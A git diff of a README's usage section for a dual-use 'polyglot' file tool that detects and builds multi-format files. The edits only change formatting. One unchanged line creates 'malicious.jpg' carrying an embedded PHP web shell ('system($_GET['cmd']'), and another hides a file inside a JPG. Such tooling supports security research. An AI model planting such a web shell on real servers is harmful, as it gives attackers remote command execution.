@@ -1,18 +1,21 @@
 ## Usage Examples
 
 1. **Install the tool:**
+
 ```bash
 chmod +x install_polyglot.sh
 ./install_polyglot.sh
 ```
 
-2. **Detect file types:**
+1. **Detect file types:**
+
 ```bash
 polyglot detect suspicious_file.bin
 polyglot detect --json file1.jpg file2.zip
 ```
 
-3. **Create polyglot files:**
+1. **Create polyglot files:**
+
 ```bash
 # Simple polyglot
 polyglot create -o polyglot_file -c jpg zip pdf
@@ -24,7 +27,8 @@ polyglot create -o malicious.jpg -c jpg php --content "<?php system($_GET['cmd']
 polyglot create-zip -o hidden.jpg -f document.txt -d jpg
 ```
 
-4. **Batch analysis:**
+1. **Batch analysis:**
+
 ```bash
 # Analyze all files in directory
 polyglot detect downloads/*
